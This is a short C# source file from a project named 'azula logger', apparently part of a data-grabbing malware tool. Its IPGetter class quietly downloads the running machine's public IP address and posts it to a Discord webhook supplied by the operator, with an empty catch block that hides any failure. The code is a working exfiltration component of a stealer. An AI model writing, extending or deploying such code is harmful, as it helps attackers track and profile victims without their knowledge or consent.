using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace azula_logger
{
    class IPGetter
    {
        public static void GetIP(string webhook, string image)
        {
            try
            {            
            //making webclient
            using (WebClient webclient = new WebClient())
            {

                //Getting the IP through wtfismyip.com
                string IP = webclient.DownloadString("http://wtfismyip.com/text");
                //Sending the ip throught the webhook
                websend.sendDiscordWebhook(webhook, "azula logger", "IP: \n" + IP + "-------------------------", image);
                Thread.Sleep(100);
            }
            }
            catch{ }
        }
    }
}
